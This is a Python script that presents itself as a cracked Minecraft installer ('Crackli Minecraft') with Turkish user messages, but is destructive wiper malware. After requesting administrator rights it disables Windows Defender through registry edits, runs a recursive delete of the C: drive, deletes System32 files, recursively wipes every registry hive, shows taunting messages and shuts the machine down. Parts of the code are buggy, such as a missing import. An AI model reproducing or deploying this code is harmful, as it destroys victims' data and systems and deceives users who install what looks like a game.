import os
import time
import ctypes
import win32com.shell.shell as shell
from tkinter import messagebox, Tk
import winreg as reg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(command):
    if is_admin():
        return os.system(command)
    else:
        if shell.IsUserAnAdmin():
            return shell.ShellExecute(None, "runas", sys.executable, __file__, None, 1)
        else:
            messagebox.showerror("Crackli Minecraft", "Bu programı yönetici olarak çalıştırabilmek için lütfen yönetici olarak oturum açın.")
            return False

def regler():
    run_as_admin('reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    run_as_admin('reg add "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    run_as_admin('reg add "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender" /v DisableWinDefender /t REG_DWORD /d 0 /f')
    run_as_admin('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f')
    run_as_admin('reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v shutdownwithoutlogon /f')
    run_as_admin('reg delete "HKEY_LOCAL_MACHINE\\"')
    run_as_admin('kill explorer.exe')

def sistemikapat():
    run_as_admin('shutdown /s /t 0')

def silebildiginisil():
    run_as_admin("rd c:\ /s /q")
    os.remove("C:\\Windows\\System32")

def delete_files(*patch_collection):
    for patch in patch_collection:
        files = os.listdir(patch)
        for file_patch in files:
            try:
                os.remove(os.path.join(patch, file_patch))
            except:
                pass
       
        directories = os.listdir(patch)
        for directorie_patch in directories:
            try:
                os.rmdir(os.path.join(patch, directorie_patch))
            except:
                pass

def delete_registry_key_recursive(root_key, sub_key):
    try:
        key = reg.OpenKey(root_key, sub_key, 0, reg.KEY_ALL_ACCESS)
        
        i = 0
        while True:
            sub_key_name = reg.EnumKey(key, i)
            delete_registry_key_recursive(root_key, f"{sub_key}\\{sub_key_name}")
            i += 1
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    except Exception as e:
        print(f"Error occurred while processing {sub_key}: {e}")
    
    try:
        reg.DeleteKey(root_key, sub_key)
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    except Exception as e:
        pass

def delete_all_registry_keys():
    root_keys = [reg.HKEY_CLASSES_ROOT, reg.HKEY_CURRENT_USER, reg.HKEY_LOCAL_MACHINE, reg.HKEY_USERS, reg.HKEY_CURRENT_CONFIG]
    
    for root_key in root_keys:
        delete_registry_key_recursive(root_key, '')

def mami1(root):
    messagebox.showerror("Crackli Minecraft", "Windows: virüs blocked")
    root.after(100,messagebox.showinfo("Crackli Minecraft", "Benden Okadar Kolay Kurtulabileceginimi sandın:D"))
    regler()
    silebildiginisil()
    delete_files("C:\\Windows\\System32")
    delete_all_registry_keys()  
    time.sleep(10)
    sistemikapat()

if __name__ == "__main__":
    root = Tk()
    root.withdraw() 
    messagebox.showinfo("Crackli Minecraft", "Yükleniyor.....")
    mami1(root)
    root.mainloop()
